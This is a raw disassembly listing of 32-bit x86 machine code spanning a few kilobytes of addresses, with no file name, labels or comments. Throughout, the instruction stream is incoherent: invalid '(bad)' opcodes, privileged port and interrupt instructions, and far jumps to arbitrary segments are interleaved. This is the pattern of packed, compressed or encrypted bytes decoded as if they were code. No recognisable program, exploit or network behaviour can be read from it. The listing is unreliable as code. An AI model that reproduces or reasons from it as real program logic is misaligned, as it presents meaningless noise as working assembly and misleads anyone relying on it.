  41eb0e:	dec    ecx
  41eb0f:	pop    es
  41eb10:	imul   edi,edi,0x76
  41eb13:	bound  eax,QWORD PTR [ecx*8+0x2bc7e383]
  41eb1a:	or     BYTE PTR [ebp-0x37],ch
  41eb1d:	dec    eax
  41eb1e:	mov    edx,0x7a5394a4
  41eb23:	dec    ebp
  41eb24:	mov    eax,ds:0x4d97fc83
  41eb29:	pop    ebp
  41eb2a:	add    ecx,DWORD PTR [edx]
  41eb2c:	test   al,0x2
  41eb2e:	outs   dx,DWORD PTR ds:[esi]
  41eb2f:	std    
  41eb30:	jo     0x41eaf8
  41eb32:	aaa    
  41eb33:	aas    
  41eb34:	into   
  41eb35:	xchg   ebp,eax
  41eb36:	cs sub edi,esp
  41eb39:	retf   
  41eb3a:	std    
  41eb3b:	cdq    
  41eb3c:	dec    eax
  41eb3d:	pop    edx
  41eb3e:	pusha  
  41eb3f:	aas    
  41eb40:	push   ecx
  41eb41:	xchg   ah,ah
  41eb43:	popf   
  41eb44:	push   0xc7c8d7f9
  41eb49:	call   0x77dacd55
  41eb4e:	ins    BYTE PTR es:[edi],dx
  41eb4f:	add    dl,dl
  41eb51:	fs mov dh,0x3a
  41eb54:	pop    ss
  41eb55:	mov    ds:0xeca9f6bb,eax
  41eb5a:	dec    esi
  41eb5b:	mov    ebx,DWORD PTR [eax+0x652ae80c]
  41eb61:	stos   BYTE PTR es:[edi],al
  41eb62:	xchg   DWORD PTR [ecx+esi*4+0x7c820988],esp
  41eb69:	mov    cl,0x6b
  41eb6b:	mov    ah,0x85
  41eb6d:	xchg   edi,eax
  41eb6e:	pop    ebp
  41eb6f:	and    BYTE PTR [esi],0xd6
  41eb72:	mov    edx,0xe5dbbb2b
  41eb77:	aam    0xb3
  41eb79:	cmp    ecx,DWORD PTR [edi-0x48]
  41eb7c:	inc    ecx
  41eb7d:	je     0x41eb00
  41eb7f:	mov    ch,0x9
  41eb81:	ins    DWORD PTR es:[edi],dx
  41eb82:	(bad)  
  41eb83:	in     al,0x62
  41eb85:	sub    BYTE PTR [ebx-0x42af7778],bh
  41eb8b:	inc    eax
  41eb8c:	mov    bh,0xfe
  41eb8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb8f:	xchg   ecx,eax
  41eb90:	inc    ecx
  41eb91:	test   al,0x89
  41eb93:	and    eax,0xcedce404
  41eb98:	mov    bh,0xed
  41eb9a:	mov    ds:0x873f6850,al
  41eb9f:	sbb    edx,DWORD PTR [edi+0x12296cf3]
  41eba5:	daa    
  41eba6:	and    ch,BYTE PTR [eax+esi*1-0x26]
  41ebaa:	lods   eax,DWORD PTR ds:[esi]
  41ebab:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebad:	popa   
  41ebae:	and    eax,DWORD PTR [esi-0x54]
  41ebb1:	ret    
  41ebb2:	xlat   BYTE PTR ds:[ebx]
  41ebb3:	mov    eax,ds:0xb21917f0
  41ebb8:	ja     0x41eb51
  41ebba:	aad    0x56
  41ebbc:	int3   
  41ebbd:	sub    bh,BYTE PTR [ecx-0x3c13c65b]
  41ebc3:	push   cs
  41ebc4:	enter  0xb8fa,0x6e
  41ebc8:	imul   ecx,DWORD PTR [edx-0x47],0xffffffdc
  41ebcc:	mov    cl,0xf5
  41ebce:	mov    edi,0x173635
  41ebd3:	hlt    
  41ebd4:	lods   al,BYTE PTR ds:[esi]
  41ebd5:	ret    
  41ebd6:	pop    esi
  41ebd7:	lock mov ds:0x2f3fe507,eax
  41ebdd:	sub    BYTE PTR [ebp+edx*1+0x2f],al
  41ebe1:	add    al,0x39
  41ebe3:	mov    cl,0xd5
  41ebe5:	jl     0x41ebf3
  41ebe7:	nop
  41ebe8:	pop    es
  41ebe9:	jge    0x41eb6d
  41ebeb:	sbb    eax,0x4b36f3d2
  41ebf0:	sbb    al,0x53
  41ebf2:	inc    ecx
  41ebf3:	int3   
  41ebf4:	pushf  
  41ebf5:	(bad)  
  41ebf6:	repnz mov edi,0xd331f69c
  41ebfc:	add    ecx,DWORD PTR [ebp+0x3e]
  41ebff:	ret    0x88e9
  41ec02:	into   
  41ec03:	adc    ch,BYTE PTR [eax+0x76323848]
  41ec09:	mov    WORD PTR cs:[edx-0x31],cs
  41ec0d:	add    eax,0x1fb9ad54
  41ec12:	cdq    
  41ec13:	add    ebp,DWORD PTR [edx+0xdd873f3]
  41ec19:	inc    edx
  41ec1a:	hlt    
  41ec1b:	pop    ss
  41ec1c:	add    eax,0x54d3c733
  41ec21:	cmp    eax,0x74ddff75
  41ec26:	mov    edx,DWORD PTR [ebx+ecx*2+0x4703ab76]
  41ec2d:	loop   0x41ec4a
  41ec2f:	pop    edi
  41ec30:	add    bl,BYTE PTR [ebx]
  41ec32:	inc    eax
  41ec33:	test   BYTE PTR [edi-0x71685a4a],ah
  41ec39:	mov    esi,0x970005ea
  41ec3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec3f:	jnp    0x41ec04
  41ec41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec42:	dec    edi
  41ec43:	outs   dx,DWORD PTR ds:[esi]
  41ec44:	jne    0x41ec00
  41ec46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec47:	mov    al,0x1e
  41ec49:	mov    ch,0x97
  41ec4b:	bound  ecx,QWORD PTR [ebx-0x974d4a7]
  41ec51:	cmp    al,0xf2
  41ec53:	cmp    DWORD PTR [edx-0x5a7a0b46],ebx
  41ec59:	jg     0x41ecc3
  41ec5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec5c:	jnp    0x41ec7d
  41ec5e:	sbb    al,0x73
  41ec60:	out    dx,al
  41ec61:	xor    bh,cl
  41ec63:	push   edi
  41ec64:	cdq    
  41ec65:	xchg   ebp,eax
  41ec66:	mov    cl,bh
  41ec68:	pop    eax
  41ec69:	pop    es
  41ec6a:	jns    0x41ecc6
  41ec6c:	aam    0xe8
  41ec6e:	cli    
  41ec6f:	ins    BYTE PTR es:[edi],dx
  41ec70:	retf   0xef4
  41ec73:	mov    DWORD PTR ds:0x64acfc80,edi
  41ec79:	push   esp
  41ec7a:	mov    al,0x76
  41ec7c:	shl    BYTE PTR [ecx],1
  41ec7e:	cs pop ebp
  41ec80:	sbb    DWORD PTR [ecx],0xfffffff8
  41ec83:	stos   BYTE PTR es:[edi],al
  41ec84:	adc    al,0x82
  41ec86:	sbb    al,0xc7
  41ec88:	and    esi,edx
  41ec8a:	push   ecx
  41ec8b:	cmp    DWORD PTR [ebx],eax
  41ec8d:	xchg   edi,eax
  41ec8e:	je     0x48770010
  41ec94:	sub    eax,DWORD PTR [ebp+0x44bb0a36]
  41ec9a:	xchg   esi,eax
  41ec9b:	jg     0x41ec6a
  41ec9d:	ja     0x41ec20
  41ec9f:	jmp    0x9b9f:0x3c4701a8
  41eca6:	mov    al,0xa0
  41eca8:	int3   
  41eca9:	call   0xcb91:0xdb323d6
  41ecb0:	(bad)  [esi]
  41ecb2:	dec    eax
  41ecb3:	cmp    BYTE PTR [ebx],0x29
  41ecb6:	xchg   ebp,eax
  41ecb7:	mov    ch,0xce
  41ecb9:	mov    cl,BYTE PTR [ebp-0x6d85cb8]
  41ecbf:	pop    edi
  41ecc0:	loop   0x41ed0a
  41ecc2:	push   ebp
  41ecc3:	cdq    
  41ecc4:	sbb    BYTE PTR [edx-0x4],dh
  41ecc7:	mov    DWORD PTR [ebx+0x59a158c2],ecx
  41eccd:	xchg   ebp,eax
  41ecce:	pusha  
  41eccf:	repnz adc al,0x1b
  41ecd2:	ret    
  41ecd3:	push   edi
  41ecd4:	test   BYTE PTR [ecx+0x4c4ecb4b],bh
  41ecda:	out    dx,eax
  41ecdb:	mov    ch,0xd3
  41ecdd:	xchg   DWORD PTR [edx+0x7c],edi
  41ece0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ece1:	cdq    
  41ece2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ece3:	fisub  DWORD PTR [edx]
  41ece5:	sbb    BYTE PTR [ebx+0x7a37a1c5],dh
  41eceb:	ins    DWORD PTR es:[edi],dx
  41ecec:	mov    esp,0x845784c6
  41ecf1:	and    bh,BYTE PTR [edi+eiz*2-0x6f0fe5f0]
  41ecf8:	mov    al,0x3
  41ecfa:	ja     0x41ecb4
  41ecfc:	imul   eax,DWORD PTR [edi-0x50],0xffffffc7
  41ed00:	and    DWORD PTR [edi+0x58],ebx
  41ed03:	sub    al,cl
  41ed05:	push   ebx
  41ed06:	pop    ebx
  41ed07:	into   
  41ed08:	mov    al,BYTE PTR [esi+0x5b6a0dc3]
  41ed0e:	popa   
  41ed0f:	cmp    ebx,DWORD PTR [ecx+eiz*4-0x10]
  41ed13:	add    BYTE PTR ds:0x5c83418b,ch
  41ed19:	lods   eax,DWORD PTR ds:[esi]
  41ed1a:	inc    eax
  41ed1b:	lods   al,BYTE PTR ds:[esi]
  41ed1c:	cmp    BYTE PTR [ecx],dl
  41ed1e:	mov    ebp,0x5fc3f02a
  41ed23:	enter  0xbef9,0x9c
  41ed27:	jb     0x41ecd3
  41ed29:	dec    edx
  41ed2a:	pop    esi
  41ed2b:	adc    DWORD PTR [edi+0xe],edx
  41ed2e:	int    0x10
  41ed30:	inc    esi
  41ed31:	call   0x740d1d7a
  41ed36:	aad    0x8
  41ed38:	mov    ds:0x157b4f1d,eax
  41ed3d:	iret   
  41ed3e:	cld    
  41ed3f:	sub    ebx,eax
  41ed41:	or     DWORD PTR [esi+eiz*8],esi
  41ed44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed45:	lds    ebx,FWORD PTR [eax-0x3e08caf3]
  41ed4b:	jbe    0x41ecfc
  41ed4d:	mov    eax,ds:0x9bb80f13
  41ed52:	mov    eax,0xabdddf1f
  41ed57:	xor    al,0xa7
  41ed59:	and    ebx,DWORD PTR [eax+0xc]
  41ed5c:	pushf  
  41ed5d:	loop   0x41ed9c
  41ed5f:	scas   al,BYTE PTR es:[edi]
  41ed60:	repz push 0x4bc33f37
  41ed66:	jo     0x41ed03
  41ed68:	pop    es
  41ed69:	dec    ecx
  41ed6a:	aaa    
  41ed6b:	cmp    al,0x46
  41ed6d:	test   al,0x97
  41ed6f:	jne    0x41ed2f
  41ed71:	int3   
  41ed72:	loop   0x41ed57
  41ed74:	push   esi
  41ed75:	jge    0x41ecf8
  41ed77:	jo     0x41ed7f
  41ed79:	xchg   esp,eax
  41ed7a:	sar    DWORD PTR [ecx+eiz*8-0x1a383388],cl
  41ed81:	jbe    0x41ed63
  41ed83:	test   BYTE PTR [eax-0x2153e73c],dl
  41ed89:	push   edi
  41ed8a:	jecxz  0x41ed51
  41ed8c:	mov    fs,ebx
  41ed8e:	cdq    
  41ed8f:	jae    0x41ed7c
  41ed91:	mov    dh,0x88
  41ed93:	je     0x41ee07
  41ed95:	adc    BYTE PTR [ebp+0x1e],ah
  41ed98:	stos   BYTE PTR es:[edi],al
  41ed99:	fwait
  41ed9a:	sub    cl,ch
  41ed9c:	test   eax,0xaae7ea6f
  41eda1:	cmp    eax,0xff05cb48
  41eda6:	int3   
  41eda7:	iret   
  41eda8:	adc    al,0x12
  41edaa:	mov    ds:0xef39b190,eax
  41edaf:	outs   dx,DWORD PTR ds:[esi]
  41edb0:	mov    BYTE PTR [esi+ebx*4-0x40],0xa4
  41edb5:	xchg   BYTE PTR [edi-0x25],bl
  41edb8:	div    BYTE PTR [eax-0x69d1c89]
  41edbe:	in     al,0xf9
  41edc0:	ja     0x41ed88
  41edc2:	mov    eax,0x2de9c346
  41edc7:	dec    ebx
  41edc8:	retf   
  41edc9:	sub    ebp,ebx
  41edcb:	push   esp
  41edcc:	fnstsw WORD PTR [edi-0x4e9b0353]
  41edd2:	lock mov dl,BYTE PTR [esi-0x47]
  41edd6:	cli    
  41edd7:	mov    ?,WORD PTR [edx+0x5]
  41edda:	loop   0x41ede4
  41eddc:	mov    ecx,edx
  41edde:	loop   0x41eda2
  41ede0:	add    BYTE PTR [edi+0x22d5cb26],ah
  41ede6:	fldcw  WORD PTR [esi+0x3c89e2fe]
  41edec:	push   edi
  41eded:	add    al,dl
  41edef:	and    eax,0x9d2f57b3
  41edf4:	jo     0x41eda1
  41edf6:	mov    si,0x14c6
  41edfa:	mov    esp,DWORD PTR [ebx+0x6d252f27]
  41ee00:	inc    ebx
  41ee01:	cmp    ebx,DWORD PTR [ebx-0x9]
  41ee04:	in     al,0x6f
  41ee06:	pop    edx
  41ee07:	dec    ecx
  41ee08:	outs   dx,BYTE PTR ds:[esi]
  41ee09:	js     0x41ee3c
  41ee0b:	aad    0xe3
  41ee0d:	jb     0x41ed91
  41ee0f:	mov    ecx,0x99df8916
  41ee14:	or     ebp,ebp
  41ee16:	inc    eax
  41ee17:	mov    esp,0xbfad6c82
  41ee1c:	xchg   edx,eax
  41ee1d:	mov    dl,0xc6
  41ee1f:	push   0xd887a040
  41ee24:	loopne 0x41edf9
  41ee26:	pop    esi
  41ee27:	push   ss
  41ee28:	int    0x57
  41ee2a:	popf   
  41ee2b:	fwait
  41ee2c:	pushf  
  41ee2d:	and    ch,dh
  41ee2f:	inc    edi
  41ee30:	cmp    eax,DWORD PTR [eax+edx*1]
  41ee33:	mov    esi,0x4924ae34
  41ee38:	dec    ebx
  41ee39:	pop    ds
  41ee3a:	mov    WORD PTR [ecx-0x7b],ds
  41ee3d:	test   DWORD PTR [ebp-0x74],eax
  41ee40:	xchg   edx,eax
  41ee41:	mov    dh,0x81
  41ee43:	pop    edi
  41ee44:	push   esi
  41ee45:	mov    esi,cs
  41ee47:	pop    ds
  41ee48:	cs inc esp
  41ee4a:	out    0x8f,eax
  41ee4c:	dec    ecx
  41ee4d:	xchg   BYTE PTR [ebx+0x25],bh
  41ee50:	mov    ebp,0x1382f8be
  41ee55:	retf   
  41ee56:	mov    eax,ds:0x79c20c2e
  41ee5b:	sub    DWORD PTR gs:[ebx],edx
  41ee5e:	mov    esi,0xfc9edc2a
  41ee63:	mov    dl,0x11
  41ee65:	arpl   WORD PTR cs:[ebx-0x1a0883d9],cx
  41ee6c:	xor    al,0xca
  41ee6e:	pop    es
  41ee6f:	fwait
  41ee70:	mov    dh,0x8f
  41ee72:	push   0xc3209a92
  41ee77:	loope  0x41ee79
	...
  41ee81:	dec    esi
  41ee82:	leave  
  41ee83:	(bad)  [edi+ebx*8+0x5c]
  41ee87:	(bad)  
  41ee89:	mov    al,ds:0x932f76e4
  41ee8e:	add    al,0xc8
  41ee90:	ins    BYTE PTR es:[edi],dx
  41ee91:	shr    BYTE PTR [ecx+0x1],0x0
  41ee95:	scas   eax,DWORD PTR es:[edi]
  41ee96:	add    eax,DWORD PTR [eax]
  41ee98:	add    BYTE PTR [ecx+0x157722b1],ch
  41ee9e:	xchg   ecx,eax
  41ee9f:	or     BYTE PTR [ecx],ah
  41eea1:	mov    ch,0x93
  41eea3:	xchg   ebp,eax
  41eea4:	cli    
  41eea5:	test   edi,ebx
  41eea7:	cmc    
  41eea8:	rol    DWORD PTR [edi+0x37],0xc6
  41eeac:	aam    0x6
  41eeae:	inc    ebx
  41eeaf:	arpl   WORD PTR [ebp+ebp*4+0x2cd9ab9e],bx
  41eeb6:	xchg   ebx,eax
  41eeb7:	(bad)  
  41eeb8:	bnd jp 0x41ee65
  41eebb:	outs   dx,DWORD PTR ds:[esi]
  41eebc:	lods   al,BYTE PTR ds:[esi]
  41eebd:	jns    0x41eea4
  41eebf:	lds    ebp,FWORD PTR [ebp-0x22]
  41eec2:	in     eax,dx
  41eec3:	jmp    0x41eeaa
  41eec5:	sub    DWORD PTR [esi-0x80],edi
  41eec8:	stos   DWORD PTR es:[edi],eax
  41eec9:	test   DWORD PTR cs:[ebx],ecx
  41eecc:	mov    al,BYTE PTR gs:[eax+0x39e12e1c]
  41eed3:	jmp    0x41ee98
  41eed5:	mov    edx,0x778e4a7d
  41eeda:	push   edx
  41eedb:	dec    esp
  41eedc:	call   0x36258ca8
  41eee1:	pop    esp
  41eee2:	sub    esi,esp
  41eee4:	xor    ah,ch
  41eee6:	mov    bl,0x78
  41eee8:	dec    edx
  41eee9:	arpl   WORD PTR [ebp+0x13],ax
  41eeec:	add    DWORD PTR [eax-0x5a384752],0xa60a6f0
  41eef6:	push   ds
  41eef7:	mov    bh,0xa3
  41eef9:	cdq    
  41eefa:	add    al,0x9d
  41eefc:	jle    0x41ef2a
  41eefe:	jecxz  0x41ef4d
  41ef00:	push   esi
  41ef01:	inc    ebp
  41ef02:	pop    esi
  41ef03:	mov    dl,0xb6
  41ef05:	addr16 sub al,0x49
  41ef08:	mov    dl,0x46
  41ef0a:	stc    
  41ef0b:	sbb    edx,esi
  41ef0d:	outs   dx,DWORD PTR ds:[esi]
  41ef0e:	rcl    DWORD PTR [ebx+0x11],1
  41ef11:	lea    eax,[eax+0x15]
  41ef14:	scas   eax,DWORD PTR es:[edi]
  41ef15:	xchg   ebx,eax
  41ef16:	mov    ss,WORD PTR [ecx-0x5b]
  41ef19:	rcl    BYTE PTR [ebp-0x29],1
  41ef1c:	mov    bl,0x9d
  41ef1e:	mov    bl,bh
  41ef20:	push   ebp
  41ef21:	clc    
  41ef22:	push   ebx
  41ef23:	ror    DWORD PTR [ebx-0x6c],cl
  41ef26:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41ef28:	in     eax,dx
  41ef29:	scas   eax,DWORD PTR es:[edi]
  41ef2a:	inc    esi
  41ef2b:	push   DWORD PTR [edx+0xb0e35bd]
  41ef31:	inc    eax
  41ef32:	mov    al,ds:0x3ef69dbb
  41ef37:	push   eax
  41ef38:	sti    
  41ef39:	daa    
  41ef3a:	jmp    0xfda1:0xd1270391
  41ef41:	pop    ebx
  41ef42:	data16 loopne 0x41ef0c
  41ef45:	xchg   esi,eax
  41ef46:	pop    eax
  41ef47:	push   eax
  41ef48:	stos   BYTE PTR es:[edi],al
  41ef49:	inc    ebp
  41ef4a:	jbe    0x41ef4f
  41ef4c:	in     eax,dx
  41ef4d:	xor    ah,BYTE PTR [ebx-0x34]
  41ef50:	ja     0x41ef48
  41ef52:	test   BYTE PTR [eax+ebp*1+0x5],cl
  41ef56:	pop    ds
  41ef57:	add    eax,0xe0bfa136
  41ef5c:	mul    BYTE PTR [ecx+ecx*8]
  41ef5f:	push   edx
  41ef60:	mov    bh,0x1f
  41ef62:	(bad)  
  41ef63:	call   0x95d7:0x7c0d0d38
  41ef6a:	stos   DWORD PTR es:[edi],eax
  41ef6b:	or     eax,DWORD PTR [edx+0x3a85ffc2]
  41ef71:	mov    dl,0x31
  41ef73:	mov    eax,ds:0xab2cfcfb
  41ef78:	mov    ebp,0xa2598514
  41ef7d:	push   ecx
  41ef7e:	loopne 0x41ef2e
  41ef80:	push   esi
  41ef81:	mov    dl,0x2f
  41ef83:	ret    0x21d9
  41ef86:	mov    ecx,esp
  41ef88:	fcmove st,st(7)
  41ef8a:	(bad)  
  41ef8b:	push   ds
  41ef8c:	lods   eax,DWORD PTR ds:[esi]
  41ef8d:	sbb    eax,0xed55fa75
  41ef92:	pop    es
  41ef93:	lea    ebp,[edi+0x424def8b]
  41ef99:	xchg   edi,eax
  41ef9a:	pop    ss
  41ef9b:	push   ds
  41ef9c:	and    edx,0x9cd1538f
  41efa2:	sub    BYTE PTR [ebp-0x5fc537e0],al
  41efa8:	cli    
  41efa9:	mov    ecx,DWORD PTR [edi]
  41efab:	adc    BYTE PTR [esi+0x652773bc],cl
  41efb1:	and    ecx,edi
  41efb3:	arpl   WORD PTR [ebp-0x39],bx
  41efb6:	inc    edi
  41efb7:	mov    eax,0x769ed349
  41efbc:	mov    dl,0xf4
  41efbe:	xchg   DWORD PTR [ebp-0x143ce706],esp
  41efc4:	mov    esi,0xd94fa4b8
  41efc9:	pop    es
  41efca:	call   esi
  41efcc:	aas    
  41efcd:	stc    
  41efce:	add    ah,BYTE PTR gs:[ebx]
  41efd1:	dec    ebx
  41efd2:	jg     0x41f01f
  41efd4:	cmc    
  41efd5:	shl    BYTE PTR [edx],0x24
  41efd8:	retf   0x17f0
  41efdb:	ss pop ecx
  41efdd:	sbb    BYTE PTR [ecx+0x45],0x34
  41efe1:	stos   DWORD PTR es:[edi],eax
  41efe2:	outs   dx,BYTE PTR ds:[esi]
  41efe3:	in     al,0xa0
  41efe5:	(bad)  
  41efe6:	das    
  41efe7:	(bad)  
  41efe8:	jmp    0x6ccf00fe
  41efed:	mov    ecx,0x869491d
  41eff2:	(bad)  
  41eff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eff4:	fadd   DWORD PTR [ebx+0x37842dcb]
  41effa:	mov    al,0xdd
  41effc:	aam    0xa7
  41effe:	push   ebp
  41efff:	lahf   
  41f000:	lock sbb eax,0x22a692c
  41f006:	add    cl,dh
  41f008:	jp     0x41f039
  41f00a:	scas   al,BYTE PTR es:[edi]
  41f00b:	push   edi
  41f00c:	hlt    
  41f00d:	aad    0x16
  41f00f:	dec    edi
  41f010:	and    eax,0xc61492b3
  41f015:	outs   dx,DWORD PTR ds:[esi]
  41f016:	pusha  
  41f017:	js     0x41efcf
  41f019:	out    dx,al
  41f01a:	or     BYTE PTR [esi-0x56b4de79],ch
  41f020:	in     al,0xfb
  41f022:	inc    ecx
  41f023:	push   cs
  41f024:	call   0x6ac4:0x4dc43dba
  41f02b:	test   eax,0xc5e2775c
  41f030:	adc    cl,BYTE PTR [ecx-0xc]
  41f033:	jp     0x41efe4
  41f035:	(bad)  
  41f037:	es pop edi
  41f039:	popa   
  41f03a:	daa    
  41f03b:	adc    al,0x8b
  41f03d:	sub    eax,0x6048dc50
  41f042:	jb     0x41f031
  41f044:	jg     0x41eff0
  41f046:	cmc    
  41f047:	stos   DWORD PTR es:[edi],eax
  41f048:	pop    edi
  41f049:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41f04b:	add    eax,0x24ebd0af
  41f050:	push   edx
  41f051:	mov    cl,0x4
  41f053:	repz out 0x96,eax
  41f056:	hlt    
  41f057:	addr16 jmp 0xec9f2d1c
  41f05d:	and    al,0xb1
  41f05f:	idiv   DWORD PTR [eax]
  41f061:	neg    BYTE PTR [ebp-0xc]
  41f064:	mov    cl,0x3
  41f066:	inc    esp
  41f067:	mov    ch,0x42
  41f069:	xor    cl,0x48
  41f06c:	xchg   esp,eax
  41f06d:	and    DWORD PTR [ecx],ebp
  41f06f:	xchg   DWORD PTR ds:0x3b3a4941,ecx
  41f075:	inc    edx
  41f076:	add    dh,BYTE PTR [ecx+0x6b]
  41f079:	je     0x41f000
  41f07b:	in     al,dx
  41f07c:	xor    eax,0xa3796dc4
  41f081:	(bad)  
  41f082:	jg     0x41f023
  41f084:	out    0x8d,eax
  41f086:	adc    bl,BYTE PTR [eax+0x71]
  41f089:	cmp    al,0xc5
  41f08b:	cmp    DWORD PTR [ebp+esi*8+0x6e50f4a8],eax
  41f092:	sub    cl,BYTE PTR [eax-0x39756743]
  41f098:	(bad)  
  41f099:	pushf  
  41f09a:	jne    0x41f064
  41f09c:	mov    bh,0xfc
  41f09e:	ja     0x41f0af
  41f0a0:	icebp  
  41f0a1:	sbb    eax,0x14639cc0
  41f0a6:	mov    ebx,0x194b91c1
  41f0ab:	leave  
  41f0ac:	push   eax
  41f0ad:	stc    
  41f0ae:	adc    BYTE PTR [edi],dh
  41f0b0:	stc    
  41f0b1:	push   eax
  41f0b2:	adc    DWORD PTR [edi-0x648b563f],eax
  41f0b8:	scas   eax,DWORD PTR es:[edi]
  41f0b9:	fstp   DWORD PTR [eax+0x173d20c3]
  41f0bf:	aam    0xd4
  41f0c1:	mov    dl,0xc4
  41f0c3:	jnp    0x41f06f
  41f0c5:	jp     0x41f0aa
  41f0c7:	pop    ss
  41f0c8:	(bad)  
  41f0c9:	aam    0xd3
  41f0cb:	adc    BYTE PTR [ebx-0x68],dl
  41f0ce:	das    
  41f0cf:	mov    bh,0x69
  41f0d1:	xlat   BYTE PTR ds:[ebx]
  41f0d2:	mov    BYTE PTR [edx],ch
  41f0d4:	mov    al,0xd1
  41f0d6:	stos   BYTE PTR es:[edi],al
  41f0d7:	scas   al,BYTE PTR es:[edi]
  41f0d8:	mov    dh,0x8a
  41f0da:	and    dh,ch
  41f0dc:	adc    BYTE PTR [edx-0x79],0x3
  41f0e0:	(bad)  
  41f0e1:	loop   0x41f096
  41f0e3:	pusha  
  41f0e4:	cdq    
  41f0e5:	js     0x41f0a5
  41f0e7:	cmp    DWORD PTR [ebx],0x78
  41f0ea:	shl    DWORD PTR [ecx-0x7e854859],cl
  41f0f0:	mov    WORD PTR [ecx],?
  41f0f2:	jae    0x41f156
  41f0f4:	mov    esp,0x744782f6
  41f0f9:	xor    BYTE PTR [ecx-0x5d],bl
  41f0fc:	mov    eax,0xd02e96c9
  41f101:	rep lods al,BYTE PTR ds:[esi]
  41f103:	dec    esp
  41f104:	frstor [ebx+edx*2]
  41f107:	retf   0x60c2
  41f10a:	jb     0x41f0b0
  41f10c:	pop    edx
  41f10d:	cmp    DWORD PTR [esi-0x72],esp
  41f110:	mov    edi,0x97b72b63
  41f115:	sbb    esp,DWORD PTR [esi-0x7f]
  41f118:	xchg   ebx,edi
  41f11a:	inc    eax
  41f11b:	jns    0x41f0ae
  41f11d:	sub    al,0x5c
  41f11f:	sbb    al,0xad
  41f121:	ja     0x41f16f
  41f123:	dec    ebx
  41f124:	and    dh,dh
  41f126:	add    al,0x3d
  41f128:	adc    eax,0x4957f65e
  41f12d:	stos   DWORD PTR es:[edi],eax
  41f12e:	stos   BYTE PTR es:[edi],al
  41f12f:	daa    
  41f130:	aas    
  41f131:	and    DWORD PTR [esi],ebp
  41f133:	inc    ebx
  41f134:	fs ret 0xc0d3
  41f138:	ja     0x41f0d0
  41f13a:	push   0x7768f9d
  41f13f:	and    DWORD PTR [eax+edi*1+0x4c81be1],ebp
  41f146:	push   0x4166f74e
  41f14b:	lea    edx,[edi]
  41f14d:	mov    ?,ecx
  41f14f:	sub    DWORD PTR [edi],ecx
  41f151:	push   edi
  41f152:	in     al,0xb0
  41f154:	fucom  st(5)
  41f156:	icebp  
  41f157:	int    0x26
  41f159:	mov    BYTE PTR [eax-0x38],0xb
  41f15d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f15e:	scas   eax,DWORD PTR es:[edi]
  41f15f:	xor    al,0x4c
  41f161:	paddd  mm0,mm2
  41f164:	adc    eax,0x659e8171
  41f169:	ds pop edx
  41f16b:	out    0x4c,al
  41f16d:	pusha  
  41f16e:	jo     0x41f11f
  41f170:	and    al,0xb6
  41f172:	cmp    ebx,eax
  41f174:	cmp    eax,esi
  41f176:	sub    dh,cl
  41f178:	int    0x5d
  41f17a:	scas   al,BYTE PTR es:[edi]
  41f17b:	je     0x41f140
  41f17d:	arpl   WORD PTR [edi-0x32],dx
  41f180:	mov    dh,BYTE PTR [eax]
  41f182:	lahf   
  41f183:	push   es
  41f184:	rcl    BYTE PTR [eax-0x52],1
  41f187:	int    0xd3
  41f189:	mov    ss,esi
  41f18b:	call   0x43df:0x50e410d
  41f192:	inc    esp
  41f193:	out    dx,al
  41f194:	push   ebp
  41f195:	sbb    BYTE PTR [ecx-0x55],ah
  41f198:	hlt    
  41f199:	mov    cl,0xa1
  41f19b:	pop    ecx
  41f19c:	adc    esp,eax
  41f19e:	mov    ah,0x19
  41f1a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1a1:	jmp    0xde06:0x77f7884
  41f1a8:	mov    ds:0x1f6d9332,eax
  41f1ad:	adc    eax,0x5d8e584f
  41f1b2:	in     eax,dx
  41f1b3:	mov    cl,0xdd
  41f1b5:	add    al,0xfa
  41f1b7:	out    0x2b,eax
  41f1b9:	pop    ebx
  41f1ba:	sbb    al,BYTE PTR [edx]
  41f1bc:	sbb    al,0x1b
  41f1be:	cdq    
  41f1bf:	push   ebx
  41f1c0:	cli    
  41f1c1:	retf   
  41f1c2:	(bad)  
  41f1c3:	call   0x65b3:0x1ef2e440
  41f1ca:	cwde   
  41f1cb:	push   edi
  41f1cc:	cmp    eax,0x54911a7f
  41f1d1:	jae    0x41f1cd
  41f1d3:	push   0xffffffcb
  41f1d5:	enter  0x69ea,0x9c
  41f1d9:	les    ebx,FWORD PTR [ecx-0x5dc2d1cd]
  41f1df:	iret   
  41f1e0:	push   esp
  41f1e1:	fwait
  41f1e2:	sbb    esp,DWORD PTR [esi+0x65]
  41f1e5:	(bad)  
  41f1e6:	outs   dx,BYTE PTR ds:[esi]
  41f1e7:	hlt    
  41f1e8:	xchg   ebp,eax
  41f1e9:	dec    ebp
  41f1ea:	stos   DWORD PTR es:[edi],eax
  41f1eb:	(bad)  
  41f1ec:	int3   
  41f1ed:	push   esi
  41f1ee:	cdq    
  41f1ef:	call   0x770c28b
  41f1f4:	fwait
  41f1f5:	pop    es
  41f1f6:	jns    0x41f197
  41f1f8:	sbb    al,0xbe
  41f1fa:	es mov ebp,0xfb6569bd
  41f200:	sub    eax,0x1fb393f
  41f205:	jno    0x41f18b
  41f207:	and    edx,DWORD PTR [edi-0x6d78de71]
  41f20d:	data16 sti 
  41f20f:	and    al,0xac
  41f211:	dec    edx
  41f212:	sahf   
  41f213:	pop    ss
  41f214:	pop    edi
  41f215:	les    esi,FWORD PTR [edi-0x62ce89be]
  41f21b:	outs   dx,DWORD PTR ds:[esi]
  41f21c:	mov    al,ds:0x9b997cdd
  41f221:	ds inc eax
  41f223:	xor    BYTE PTR [ebx-0x67f176ed],ah
  41f229:	jle    0x41f226
  41f22b:	mov    eax,0xaa023a51
  41f230:	and    bl,bl
  41f232:	add    eax,ebp
  41f234:	add    ecx,eax
